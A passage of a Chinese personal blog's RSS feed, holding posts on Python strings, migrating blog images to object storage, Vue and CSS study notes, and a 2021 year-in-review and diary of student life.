如果不想使用&lt;code>\&lt;/code>转义，可以在字符串前加上字母&lt;code>r&lt;/code>说明&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>s1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">r&lt;/span>&lt;span style="color:#e6db74">&amp;#39;\n&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">hello, world!&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">\n&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(s1) &lt;span style="color:#75715e"># \n\\hello, world!\\\n&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用&lt;code>+&lt;/code>进行字符串拼接，使用&lt;code>*&lt;/code>重复一个字符串的内容，&lt;code>in&lt;/code>、&lt;code>not in&lt;/code>来判断字符串中是否包含子串，&lt;code>[]&lt;/code>、&lt;code>[:]&lt;/code>用来切片运算。&lt;/p>
&lt;p>字符串类型是一种结构化的、非标量类型，所以会有一系列的属性和方法。
字符串对象身上的&lt;strong>常用的函数&lt;/strong>：&lt;/p>
&lt;ul>
&lt;li>len()；获取字符串长度&lt;/li>
&lt;li>capitalize()；字符串首个字母大写的拷贝&lt;/li>
&lt;li>title()；每个字符串单词首字母大写的拷贝&lt;/li>
&lt;li>upper()；所有字符串大写的拷贝&lt;/li>
&lt;li>find()；查找字串位置。未找到值为 -1&lt;/li>
&lt;li>startswith()；以某字符开始。类似的有endswith()&lt;/li>
&lt;li>center(50,&amp;rsquo;*&amp;rsquo;)；将字符串以指定宽度居中，填充指定字符。类似的有rjust()、ljust()&lt;/li>
&lt;li>isdigit()；是否为数字构成&lt;/li>
&lt;li>isalpha()；是否为字母构成&lt;/li>
&lt;li>isalnum()；是否为数字字母构成&lt;/li>
&lt;li>strip()；获取处理左右两侧空格后的拷贝&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>格式化输出字符串&lt;/strong>
使用&lt;code>%d&lt;/code>、&lt;code>%s&lt;/code>等占位符，并在字符串结尾使用&lt;code>%()&lt;/code>列表对应。
字符串提供的&lt;code>format()&lt;/code>方法。
Python 3.6以后提供了语法糖表示，在字符串前使用&lt;code>f&lt;/code>。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>a,b &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>,&lt;span style="color:#ae81ff">10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> * &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (a, b, a &lt;span style="color:#f92672">*&lt;/span> b))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{0}&lt;/span>&lt;span style="color:#e6db74"> * &lt;/span>&lt;span style="color:#e6db74">{1}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(a, b, a &lt;span style="color:#f92672">*&lt;/span> b))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>a&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> * &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>b&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>a &lt;span style="color:#f92672">*&lt;/span> b&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="列表">列表&lt;/h3>
&lt;p>数值类型（int、float）是标量类型，列表（list）是一种结构化的、非标量类型。
可以使用下标的方式遍历列表元素，或者for循环遍历列表元素&lt;/p></description></item><item><title>博客图床迁移</title><link>/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</link><pubDate>Sun, 01 May 2022 00:00:00 +0000</pubDate><guid>/posts/play_time/%E5%8D%9A%E5%AE%A2%E5%9B%BE%E5%BA%8A%E8%BF%81%E7%A7%BB/</guid><description>&lt;h2 id="起因">起因&lt;/h2>
&lt;p>原来博客的图片使用Jsdelivr和github的方式存储访问，但是最近Jsdelivr频繁的被墙，感觉可能在未来的不久会失效，毕竟好多人用来当免费的CDN（&lt;del>比如我&lt;/del>），也会有人使用其访问些zz敏感或其他的文件，被墙了也情有可原，而且github的仓库的作用也是用来存储代码而非图床，像我这样的人也导致了仓库的滥用，所以决定找个新的途径。&lt;/p>
&lt;h2 id="过程">过程&lt;/h2>
&lt;p>当时在网上找了好久，最后在loc上找到了 一个&lt;a href="https://hostloc.com/thread-807685-1-1.html">帖子&lt;/a>，感觉把目前行得通的方法都列出来了。&lt;/p>
&lt;p>一、第三方存储&lt;/p>
&lt;ol>
&lt;li>github+jsdelivr 或 gitee 可以搭配PicGo使用&lt;/li>
&lt;li>茎肛互撸娃大佬的鸡霸图床&lt;/li>
&lt;li>国内对象存储&lt;/li>
&lt;li>使用Onedrive 或 Google Drive 搭建图床&lt;/li>
&lt;/ol>
&lt;p>二、自行搭建&lt;/p>
&lt;ol>
&lt;li>（腾讯云轻量香港 or CDN） 反代 （本地 or 大盘鸡）&lt;/li>
&lt;li>北岸域名+国内机器&lt;/li>
&lt;li>国内机器非标准端口&lt;/li>
&lt;li>家宽开通公网IP存在家里&lt;/li>
&lt;/ol>
&lt;p>三、直接嵌在文档中，图片转base64，markdown插入&lt;/p>
&lt;p>最后我是选择了良心云的cos对象存储，新用户第一年便宜，就算以后续费一年差不多也70左右。之前自己有了解过对象存储这一技术，但是当时听闻的是有人被套路云的流量计费给掏空了，这次在良心云的计费方式中找到了按量计费，这也刚好满足了博客图片也不多的需求，更不怕被人把钱包给刷爆了。&lt;/p>
&lt;p>上传的方式还是配合PicGo上传，又添加了一个&lt;a href="https://github.com/liuwave/picgo-plugin-rename-file">rename-file&lt;/a>插件实现上传路径的命名。因为感觉对象存储给的链接太长，国内没有备案的域名，使用了一个服务器直接域名重定向到对象存储给的域名。&lt;/p>
&lt;h2 id="结果">结果&lt;/h2>
&lt;p>宣布从这篇文章开始往后的图片都会用对象存储，之前的文章如果有需要评论或者联系我再补上吧。&lt;/p>
&lt;h3 id="插曲避坑">插曲（避坑）&lt;/h3>
&lt;p>期间使用对象存储测试图片的时候，发现过一阵子图片就访问不了了，去桶里一看发现空空如也，发生了两次清空也不知道啥原因，最后一次点了下清空存储桶，发现使用方式里有个&lt;strong>生命周期管理&lt;/strong>，发现是这玩意自动删除文件，所以记得把&lt;strong>生命周期规则修改一下&lt;/strong>。&lt;/p></description></item><item><title>Vue学习笔记</title><link>/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link><pubDate>Mon, 07 Mar 2022 18:16:47 +0800</pubDate><guid>/posts/vue%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="理解mvvm">理解MVVM&lt;/h2>
&lt;p>Vue参考的MVVM模型&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/16466499314121646649931302.png" alt="">&lt;/p>
&lt;p>M：模型(Model) ：data中的数据
V：视图(View) ：模板代码
VM：视图模型(ViewModel)：Vue实例
观察发现：&lt;/p>
&lt;ol>
&lt;li>data中所有的属性，最后都出现在了vm身上。&lt;/li>
&lt;li>vm身上所有的属性及Vue原型上所有属性，在Vue模板中都可以直接使用。&lt;/li>
&lt;/ol>
&lt;h2 id="数据代理">数据代理&lt;/h2>
&lt;h3 id="回顾objectdefineproperty方法">回顾Object.defineProperty方法&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-vue" data-lang="vue">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">object&lt;/span>.&lt;span style="color:#a6e22e">defineProperty&lt;/span>(&lt;span style="color:#a6e22e">person&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;age&amp;#39;&lt;/span>,{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#ae81ff">18&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">enumerable&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>&lt;span style="color:#75715e">//控制属性是否可以枚举，默认值是false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">writable&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">，&lt;/span>&lt;span style="color:#75715e">//控制属性是否可以被修改，默认值是false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">configurable&lt;/span>&lt;span style="color:#f92672">:&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span> &lt;span style="color:#75715e">//控制属性是否可以被删除，默认值是false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//当有人读取person的age属性时，get函数（getter)就会被调用，且返回值就是age的值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">number&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#a6e22e">set&lt;/span>(&lt;span style="color:#a6e22e">value&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">number&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="数据代理-1">数据代理&lt;/h3>
&lt;p>何为数据代理？通过一个对象来修改另一个对象。&lt;/p>
&lt;p>例如，obj={x:100}&lt;/p>
&lt;p>obj2={y:200}&lt;/p>
&lt;p>使用Object.defineProperty方法，设置obj2的x属性get和set方法与obj绑定&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-vue" data-lang="vue">&lt;span style="display:flex;">&lt;span>Object.&lt;span style="color:#a6e22e">defineProperty&lt;/span>(&lt;span style="color:#a6e22e">obj2&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;x&amp;#39;&lt;/span>,{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">get&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span>.&lt;span style="color:#a6e22e">x&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>},
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">set&lt;/span>(&lt;span style="color:#a6e22e">value&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">obj&lt;/span>.&lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>})
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在script标签里设置的data属性值，绑定的是vm中的_data属性&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/16467060352831646706034381.png" alt="">&lt;/p>
&lt;p>&lt;strong>Vue中的数据代理：&lt;/strong>
通过vm对象来代理data对象中属性的操作（读/写）
&lt;strong>Vue中数据代理的好处：&lt;/strong>
更加方便的操作data中的数据
&lt;strong>基本原理：&lt;/strong>
通过0bject.defineProperty()把data对象中所有属性添加到vm上。为每一个添加到vm上的属性，都指定一个getter/setter。在getter/setter内部去操作（读/写）data中对应的属性。&lt;/p>
&lt;h2 id="事件处理">事件处理&lt;/h2>
&lt;p>事件的基本使用：&lt;/p>
&lt;ol>
&lt;li>使用&lt;strong>v-on:xxx&lt;/strong> 或 &lt;strong>@xxx&lt;/strong> 绑定事件，其中xxx是事件名；&lt;/li>
&lt;li>事件的回调需要配置在methods对象中，最终会在vm上；&lt;/li>
&lt;li>methods中配置的函数，不要用箭头函数！否则this就不是vm了；&lt;/li>
&lt;li>methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；&lt;/li>
&lt;li>@click=&amp;ldquo;demo&amp;rdquo; 和 @click=&amp;ldquo;demo($event)&amp;ldquo;效果一致，但后者可以传参；&lt;/li>
&lt;li>@click=&amp;ldquo;yyy&amp;rdquo;，其中yyy可以写一些简单的语句&lt;/li>
&lt;/ol>
&lt;h2 id="事件修饰符">事件修饰符&lt;/h2>
&lt;p>使用示例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">a&lt;/span> &lt;span style="color:#a6e22e">href&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;xxx&amp;#34;&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">@&lt;/span>&lt;span style="color:#a6e22e">click&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">.&lt;/span>&lt;span style="color:#a6e22e">prevent&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;showInfo&amp;#34;&lt;/span>&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>event事件中可以使用e.preventDefault()阻止默认事件，vue中可以使用@click.&lt;strong>prevent&lt;/strong>=&amp;lsquo;xxx&amp;rsquo;的修饰方式使用该方法。&lt;/p>
&lt;p>&lt;strong>扫盲：&lt;/strong>&lt;/p>
&lt;p>事件冒泡 ：当一个元素接收到事件的时候 会把他接收到的事件传给自己的父级，一直到window 。（注意这里传递的仅仅是事件 并不传递所绑定的事件函数。所以如果父级没有绑定事件函数，就算传递了事件 也不会有什么表现 但事件确实传递了。）&lt;/p></description></item><item><title>CSS学习</title><link>/posts/css%E5%AD%A6%E4%B9%A0/</link><pubDate>Tue, 15 Feb 2022 09:28:06 +0800</pubDate><guid>/posts/css%E5%AD%A6%E4%B9%A0/</guid><description>&lt;h3 id="选择器">选择器&lt;/h3>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>element&lt;/th>
 &lt;th>p&lt;/th>
 &lt;th>选择所有 &amp;lt;p&amp;gt; 元素。&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>element.class&lt;/td>
 &lt;td>p.intro&lt;/td>
 &lt;td>选择 class=&amp;ldquo;intro&amp;rdquo; 的所有 &amp;lt;p&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>element,element&lt;/td>
 &lt;td>div, p&lt;/td>
 &lt;td>选择所有 &amp;lt;div&amp;gt; 元素和所有 &amp;lt;p&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>element element&lt;/td>
 &lt;td>div p&lt;/td>
 &lt;td>选择 &amp;lt;div&amp;gt; 元素内的所有 &amp;lt;p&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>element&amp;gt;element&lt;/td>
 &lt;td>div &amp;gt; p&lt;/td>
 &lt;td>选择父元素是 &amp;lt;div&amp;gt; 的所有 &amp;lt;p&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>element+element&lt;/td>
 &lt;td>div + p&lt;/td>
 &lt;td>选择紧跟 &amp;lt;div&amp;gt; 元素的首个 &amp;lt;p&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>element1~element2&lt;/td>
 &lt;td>p ~ ul&lt;/td>
 &lt;td>选择前面有 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;ul&amp;gt; 元素。&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h3 id="选择器的权重">选择器的权重&lt;/h3>
&lt;p>选择器权重（从上往下优先级变低）：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>内联样式&lt;/p>
&lt;/li>
&lt;li>
&lt;p>id选择器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>类和伪类选择器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>元素选择器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>通配选择器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>继承优先级（没有优先级）&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>比较优先级时，需要将所有选择器的优先级相加计算，最后优先级越高的优先显示（分组选择器是单独计算的）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-css" data-lang="css">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">div&lt;/span>#box &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#f92672">相加计算&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">div&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#f92672">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#f92672">span&lt;/span>	&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#f92672">单独计算&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果优先级计算后相同，则根据代码最后设置的样式显示。&lt;/p>
&lt;p>可以在样式后后面添加&lt;code>!important&lt;/code>，可以获得最高优先级（慎用）&lt;/p></description></item><item><title>2021年度总结</title><link>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</link><pubDate>Mon, 07 Feb 2022 11:04:02 +0800</pubDate><guid>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</guid><description>&lt;p>已经二月才写年度总结的估计只有我把，纯纯的懒狗一条。&lt;/p>
&lt;h1 id="个人总结">个人总结&lt;/h1>
&lt;h2 id="学业">学业&lt;/h2>
&lt;p>因为加入了学校组织的DROPS集训队，整个人都把精力投入在里面了，然后把自己学习的笔记和经验总结起来写在博客里，有种丰收的喜悦。和集训队的队友们每周会有分享会，然后还去参加了几次大型的比赛，让我知道天外有天人外有人，经常把自己缩在自己的小圈子里，再厉害也就仅限于自己的小圈子。&lt;/p>
&lt;p>下半年的考研，觉得自己努力了，但是又觉得没有努力，还是目标不够明确吧，考研的目标一降再降，最后觉得要个文凭都差不多了，和其他的大佬比起来，自己辣鸡也不是没有原因的，志向都不一样，但是又想成为厉害的人。如果考研不成功的话就打算去就业。&lt;/p>
&lt;p>目前的程度也就是在github上找一些项目自己部署到服务器，看着项目的文档自己进行一些配置，感觉距离开发越走越远了，偶尔会找一找项目的代码自己DIY点，确实也挺迷茫的，学又学不进去，之前的学校教的也忘得差不多了，感觉还是考研后和行业脱节了，将来要后追起来。&lt;/p>
&lt;h2 id="感情">感情&lt;/h2>
&lt;p>网上认识了一个网友，一起聊了很久最后算是开始了一段网恋吧，但是感觉自己经验还是很少，并且有点喜欢没有拘束的感觉，经常打游戏忘了她，觉得挺内疚的。之前的我也算是个一毛不拔的人，然后开始慢慢的会给她准备一些小礼物，和她在一起也确实让我变得开朗些，不光是和她在一起的时候，和其他的朋友心灵上的交流也变多了，和她在一起也当我打开了心扉吧。&lt;/p>
&lt;h2 id="学会用github">学会用github&lt;/h2>
&lt;p>现在才知道github上的项目真的是人类智慧的结晶，在上面找了好多有趣的项目，目前自己部署的有两个网盘、青龙面板(懂的都懂)、自己的跳板机一堆，想整点什么小工具就可以在上面找到有一样想法的人，然后借鉴一下人家的代码是如何实现的。看一些高分的项目，大概知道了些目前的项目都实现了啥样牛逼的功能，还有一些模块功能的项目，多看些这种，如果将来自己项目开发遇到一样的功能就可能有很大的帮助。&lt;/p>
&lt;h2 id="思考">思考&lt;/h2>
&lt;p>写博客真的是个记录自己成长的过程的好东西，以后坚持。&lt;/p>
&lt;p>走出自己的舒适圈，去看看外面的世界有多大，才知道目前的实力根本不够支撑自己的梦想。&lt;/p>
&lt;p>不管遇到什么样的困难，只要觉得目前的路是对的，硬着头皮顶下去，事情总会发生一些转变。&lt;/p>
&lt;p>希望能坚持一个目标一直走下去吧。&lt;/p>
&lt;p>*保持你的决心❤️&lt;/p></description></item><item><title>2021年度日记</title><link>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</link><pubDate>Thu, 03 Feb 2022 09:47:43 +0800</pubDate><guid>/posts/annual/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/</guid><description>&lt;h1 id="新年快乐">新年快乐🤗&lt;/h1>
&lt;p>年度总结被拖到了农历的年。。。确实是自己懒得离谱（确实懒嗷，这篇文章写了四天了）。年前想写但是又想迁移博客，所以没干，年后家里又置办年货要搭把手，现在咣里咣当就到初二了，属实过太快了。&lt;/p>
&lt;p>本来打算写年度总结，但是觉得太长了就改成年度日记吧。我看着手机相册，想起来什么写什么吧。（多图警告⚠️⚠️⚠️）&lt;/p>
&lt;h1 id="1-2月">1-2月&lt;/h1>
&lt;p>回家祭祖的时候遇到了两只大鹅，憨憨的看着我&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031058198.png" alt="202202031058198">&lt;/p>
&lt;p>真的是人生第一次吃必胜客的披萨，因为是个宅所以出校门的机会都不多。(真心觉得必胜客的披萨也就一般般)&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031101930.png" alt="202202031101930">&lt;/p>
&lt;p>在小黑盒上抽奖，中了一个鼠标垫，人生第二次网络上中奖，最重要的还是隔了半个月连中。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031100652.png" alt="202202031100652">&lt;/p>
&lt;p>第一次中奖是B站的一个up名字叫&lt;a href="https://space.bilibili.com/3760773">大果粒粒&lt;/a>，一周一更的搞笑视频，属于是生活必需品了，周指活。中了50块红包😋&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031106142.png" alt="202202031106142">&lt;/p>
&lt;h1 id="3-5月">3-5月&lt;/h1>
&lt;p>三月份吧，去学校就是被封在里面，好像一直到6月份放暑假都在学校，只有周日可以出去一天，我们学校还是一个单独一个学院在市中心，地方也不大真能憋死人。打听我发小的学校，通知说的到学校需要14天隔离，但是到学校第二天就睁一只眼闭一只眼，随便出门了，岂可修。&lt;/p>
&lt;p>现在疫情还没放开，去学校的话估计还是要封校，我和室友们都讨论过这话题，我们上了大学四年因为疫情姑且在学校封了半年，我们下面的2019级，到学校也就出门过半年，现在都封校到大三了，更惨的是2020级新生，从进学校就被封在里面，现在已经大二了，这感觉真的是换了个地方上高中。&lt;/p>
&lt;p>我们学校上面的领导也是脑子不好使，整个学校除了学生，其他任何人都可以随便出入，包括我们学校被当做停车场这件事，只要你给钱，我们学校车随便停，所以也有了学生开着车把人带出去，这件事更离谱，学工办的老师都把监控调出来了，清清楚楚看见车牌，没有去车管所找这辆车车主是谁，反而在学校的班长群里问车里出来的人谁认识。学校还有各种事真听得脑壳疼。&lt;/p>
&lt;p>继续流水账。&lt;/p>
&lt;p>宿舍某次出门聚餐吃了烤羊腿，这个腿啊，真的是一言难尽，我们宿舍6个人带个蹭饭的同学7个人，这个羊腿的套餐没份都不够，比如只有4-5个，让我们分的很不舒服，并且这个腿吃着完全没有味道！好多地方嚼不动。已经被我标记了&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202031122638.png" alt="202202031122638">&lt;/p>
&lt;p>今年更得番《奇蛋物语》感觉太棒了，剧情讲的很完美，每个女生都有自己的伤口，也都有自己战斗的理由。很多角色身上的弱点性格，在自己身边和自己身上都有见过，只是当时的自己也没有深入思考过如何面对，看这部番也给了一个自己思考的机会。总之就是看完以后然我也觉得充满了力量。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032200970.png" alt="202202032200970">&lt;/p>
&lt;p>我姐在她楼下的蛋糕店办了个卡，办卡送了一个蛋糕但是我姐一个人吃不完，刚好我和爸妈一起去我姐那，就把蛋糕领回家吃了。🐭🐭我啊，最喜欢吃甜甜的蛋糕了&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032212239.png" alt="202202032212239">&lt;/p>
&lt;p>我姐特别想养小狗，让我舅帮忙找了一只崽回家，看这睡得狗仰马翻，还有一张闻着我臭jio睡的就不发了。再多的就不说了。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032214338.png" alt="202202032214338">&lt;/p>
&lt;p>在宿舍基本上就是一星期总要喝一桶可乐，后来觉得不养生室友就一起买那种临期奶，又便宜又能换换口味，当时我们宿舍和室友的女朋友的宿舍，一起合买了17箱奶，后来还是一两个星期都干差不多了。冰山一角↓&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032218031.png" alt="202202032218031">&lt;/p>
&lt;p>对面宿舍买了个包子玩具，说是解压玩儿的，这我不好说了。我和一个室友看上了，也在网上买了两个&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032253000.png" alt="">&lt;/p>
&lt;p>我找到了一张照片，是我早上爬起来发现嘴边有点痒，用照相机一拍，原来是蚊子在我嘴上叮了一口，我淦&lt;/p>
&lt;p>2021年4月18日，Steam上的《绣湖:旅馆》白给了，可惜已经买了被小刺。&lt;/p>
&lt;p>给我爸换了新手机红米K40。&lt;/p>
&lt;p>我姐NS到了，让我盯着游戏打折买游戏，当时买了健身环、动森。后来打折还买了塞尔达、分手厨房、奥德赛。&lt;/p>
&lt;p>大概5月份成了预备党员。&lt;/p>
&lt;p>指环王重映了，这估计是我姐在高中那会看的，想再看一遍但又找不到人，就叫上我一起，我顺便蹭我姐饭/大笑。那阵子指环王是一周上一一部，一共三部曲看了三个星期。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032253383.png" alt="">&lt;/p>
&lt;h1 id="6月">6月&lt;/h1>
&lt;p>在宿舍楼里看到外面风景很棒，就随手拍了&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202032259268.png" alt="image-20220203225926080">&lt;/p>
